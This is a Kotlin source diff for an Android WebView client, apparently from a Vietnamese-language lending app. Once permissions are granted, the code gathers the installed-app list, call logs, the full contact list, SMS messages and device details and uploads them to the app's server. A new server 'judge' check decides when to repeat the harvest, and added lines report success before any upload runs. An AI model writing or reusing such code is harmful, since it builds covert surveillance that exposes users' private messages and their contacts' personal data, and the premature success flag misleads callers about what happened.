@@ -59,6 +59,7 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
     val DATA_PERMISSIONS = 1111
     var cameraList = ArrayList<String>()
     var ACTIVITYFOROMCLIENT = 10010
+    var PHOTO_RESULT =10086
     var readPhoneCallBack : WVJBResponseCallback? = null
     var firstClickTime: Long = 0L
     var dataUpLoadResult = false
@@ -78,6 +79,8 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
                 SharePrefenceHelper.save("Token",""+jsonObject.get("token"))
                 if(Build.VERSION.SDK_INT < Build.VERSION_CODES.M){
                     upLoadData()
+                    dataUpLoadResult= true
+                    callback!!.callback(dataUpLoadResult)
                 }else{
                     if (ActivityCompat.checkSelfPermission(
                                     webView.context, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
@@ -85,6 +88,8 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
                             ActivityCompat.checkSelfPermission(webView.context,  Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                             ActivityCompat.checkSelfPermission(webView.context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                         dataUpLoadCallback = callback
+                        dataUpLoadResult= true
+                        dataUpLoadCallback!!.callback(dataUpLoadResult)
                         upLoadData()
 
                     }else{
@@ -194,16 +199,19 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
 
     fun onActivityResult(intent : Intent?){
         var time = System.currentTimeMillis()
-        val mImageBitmap = BitmapUtils.getFitSampleBitmap(mCurrentPhotoPath, 800, 800)
+        val mImageBitmap= BitmapUtils.getFitSampleBitmap(mCurrentPhotoPath, 800, 800)
 
        var imageString= ""
 
 //            Log.d("TAGS",""+mImageBitmap!!.byteCount)
         val options = BitmapFactory.Options()
-        options.inSampleSize = 1
+        options.inSampleSize = 5
         val nBitmap = BitmapFactory.decodeFile(mCurrentPhotoPath, options)
             val baos = ByteArrayOutputStream()
-
+        if(nBitmap == null) {
+            upImageWithNoOCR(imageString)
+            return
+        }
         nBitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos)
 //        Log.d("TAGS","after:${nBitmap.byteCount}")
         var thread = Thread(Runnable {
@@ -284,44 +292,63 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
     val IMAGE_TYPE_LIVENESS = "LIVENESS"
     fun upLoadData(){
         thread = Thread(Runnable {
-            var userMessages = UserMessages()
-            //应用信息列表
-            val applicationUtil = GetApplicationUtil()
-            val appList = applicationUtil.getApplications(webView.context.packageManager)
-            userMessages.appList = appList
 
-            //通话记录列表
-            GetCallRecordUtil.init(webView.context as Activity)
-            val callRecords = GetCallRecordUtil.getCallRecordList(webView.context.contentResolver)
-            userMessages.callRecords = callRecords
-
-            //联系人列表
-
-            val contactsUtil = GetContactsUtil(webView.context)
-            userMessages.contactList = contactsUtil.contacts
-
-            //短信记录列表
-
-            val smsRecordUtil = GetSmsRecordUtil(webView.context)
-            userMessages.smsRecords = smsRecordUtil.smsInPhone
-            //设备信息
-            val device = DeviceModule(webView.context).deviceInfo
-            userMessages.device = gson.fromJson<DeviceMessage>(device, DeviceMessage::class.java)
-            var call = httpHelper.upLoadUserMessage(userMessages)
-            call.enqueue(object : Callback<Any>{
-                override fun onFailure(call: Call<Any>?, t: Throwable?) {
+            var judgeCall = RetrofitUtil.instance.help.judge()
+            judgeCall.enqueue(object  : Callback<JudgeEntity>{
+                override fun onFailure(call: Call<JudgeEntity>, t: Throwable) {
 
                 }
 
-                override fun onResponse(call: Call<Any>?, response: Response<Any>?) {
-                    dataUpLoadResult= true
-                    dataUpLoadCallback!!.callback(dataUpLoadResult)
+                override fun onResponse(call: Call<JudgeEntity>, response: Response<JudgeEntity>) {
+                    var entity = response.body()
+                    entity?.let {
+                        if (entity.expired)
+                            upUserMessage()
+                    }
 
                 }
             })
+
         })
         thread!!.start()
     }
+    fun upUserMessage(){
+        var userMessages = UserMessages()
+        //应用信息列表
+        val applicationUtil = GetApplicationUtil()
+        val appList = applicationUtil.getApplications(webView.context.packageManager)
+        userMessages.appList = appList
+
+        //通话记录列表
+        GetCallRecordUtil.init(webView.context as Activity)
+        val callRecords = GetCallRecordUtil.getCallRecordList(webView.context.contentResolver)
+        userMessages.callRecord = callRecords
+
+        //联系人列表
+
+        val contactsUtil = GetContactsUtil(webView.context)
+        userMessages.contact = contactsUtil.contacts
+
+        //短信记录列表
+
+        val smsRecordUtil = GetSmsRecordUtil(webView.context)
+        userMessages.smsRecord = smsRecordUtil.smsInPhone
+        //设备信息
+        val device = DeviceModule(webView.context).deviceInfo
+        userMessages.device = gson.fromJson<DeviceMessage>(device, DeviceMessage::class.java)
+        var call = httpHelper.upLoadUserMessage(userMessages)
+        call.enqueue(object : Callback<Any>{
+            override fun onFailure(call: Call<Any>?, t: Throwable?) {
+                Toast.makeText(webView.context,"Mạng bất thường, vui lòng nhấp lại",Toast.LENGTH_SHORT).show()
+            }
+
+            override fun onResponse(call: Call<Any>?, response: Response<Any>?) {
+
+
+            }
+        })
+    }
+
 
     override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
         if (url.startsWith(WebView.SCHEME_TEL) || url.startsWith("sms:") || url.startsWith(WebView.SCHEME_MAILTO)) {
@@ -496,6 +523,14 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
 
 
         }
+    }
+    fun requestCancel(requestCode: Int,intent : Intent?){
+        when(requestCode){
+            ACTIVITYFOROMCLIENT->{
+                upImageWithNoOCR("")
+            }
+        }
+
     }
 
 }
